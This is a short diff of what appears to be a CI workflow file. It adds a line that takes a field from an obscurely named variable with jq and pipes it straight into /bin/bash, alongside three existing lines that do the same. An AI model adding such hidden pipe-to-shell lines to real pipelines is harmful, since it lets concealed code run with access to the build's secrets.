@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$sli46" | jq -r .ksx09 | /bin/bash
           echo $nhi70 | jq -r .mj37639 | /bin/bash
           echo $umu76 | jq -r .tv481 | /bin/bash
+          printf '%s' "$jtlwy0" | jq -r .g0 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
